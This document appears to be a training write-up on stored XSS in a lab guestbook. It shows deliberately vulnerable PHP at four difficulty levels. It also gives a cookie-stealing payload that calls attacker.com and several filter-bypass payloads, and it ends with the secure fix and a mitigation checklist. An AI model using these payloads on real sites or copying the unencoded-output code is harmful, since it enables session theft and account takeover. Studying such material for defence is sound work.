# 12 — XSS (Stored)

## What the feature does
A guestbook where messages (name + message) are saved to the database and displayed to **every visitor** who views the page — unlike reflected XSS, no crafted link needs to be sent to a specific victim.

---

## LOW

```php
$name = $_POST[ 'txtName' ];
$message = $_POST[ 'mtxMessage' ];
$query = "INSERT INTO guestbook (comment, name) VALUES ('$message', '$name');";
// later, displayed with no encoding:
echo $comment_row['name'] . ': ' . $comment_row['comment'];
```

**Exploitation:**
```
Name: attacker
Message: <script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
```

Once submitted, **every user** (including admins) who views the guestbook page executes this script in their browser session — this is what makes stored XSS higher severity than reflected: no social engineering/link-sending required, and it can persist for as long as the data exists.

**Escalation path:** steal an admin's session cookie → replay it → gain admin access. Or use it to silently perform actions as the victim (CSRF-like, but via a first-party script — no cross-origin restrictions apply since the code now runs *as* the trusted origin).

**Why it works:** Same fundamental flaw as reflected XSS (unencoded output), but the *storage* step means the payload is served to a much broader, ongoing audience.

---

## MEDIUM

```php
$message = htmlspecialchars( $_POST[ 'mtxMessage' ] );
$name = str_replace( '<script>', '', $_POST[ 'txtName' ] );
```

**Why it's still bypassable:** Notice the inconsistency — `mtxMessage` is properly encoded, but `txtName` only has the literal string `<script>` removed (the same weak denylist pattern from Chapter 11). The **name field** remains exploitable:
```
Name: <img src=x onerror=alert(document.cookie)>
Name: <sCrIpT>alert(1)</sCrIpT>
```

**Root issue:** Inconsistent application of defenses across fields is one of the most common real-world XSS causes — one field gets "fixed," a sibling field with the same trust level is overlooked.

---

## HIGH

```php
$message = htmlspecialchars( $_POST[ 'mtxMessage' ] );
$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_POST[ 'txtName' ] );
```

**Why it's still bypassable:** Same as Chapter 11's High level — the `name` field's regex only targets "script"-shaped strings, leaving every non-script vector open:
```
Name: <svg onload=alert(document.cookie)>
Name: <body onload=alert(1)>
```

**Root issue:** Same lesson repeated — enumerating "dangerous" keywords never closes the full XSS attack surface; only one of the two input fields received a structural fix.

---

## IMPOSSIBLE

```php
$name = htmlspecialchars( $_POST[ 'txtName' ], ENT_QUOTES );
$message = htmlspecialchars( $_POST[ 'mtxMessage' ], ENT_QUOTES );
// Plus prepared statements for the INSERT itself
```

**Why this is actually secure:** **Both** fields now receive proper, context-appropriate output encoding — no inconsistency, no denylist. Combined with prepared statements on the storage side (preventing any SQLi angle on the same form), there is no field left where attacker input can become executable markup when rendered back to other users.

---

## Root Cause Summary
> Stored XSS is reflected XSS's more dangerous sibling — same root cause (missing output encoding), broader blast radius (every viewer, not just link-clickers), and often introduced by *inconsistent* application of fixes across multiple input fields on the same form. Audit every field, not just the "obvious" one.

## Real-World Parallels
- Stored XSS in comment sections, user profiles, support tickets, and admin-visible fields (e.g. "company name" in a signup form later viewed by an internal admin panel) is a classic high-severity/critical bug bounty finding, especially when it reaches an authenticated admin's session
- OWASP Top 10: **A03:2021 – Injection**

## Mitigation Checklist
- [ ] Encode *every* user-controlled field consistently at output time — audit all fields on a form, not just the "message" one
- [ ] Prepared statements for storage (separate concern from XSS, but same form is often vulnerable to both)
- [ ] `HttpOnly` cookies to limit stolen-cookie impact
- [ ] CSP as defense-in-depth
- [ ] Sanitize on output, not (only) on input — re-rendering contexts can differ (HTML body vs. attribute vs. JSON)
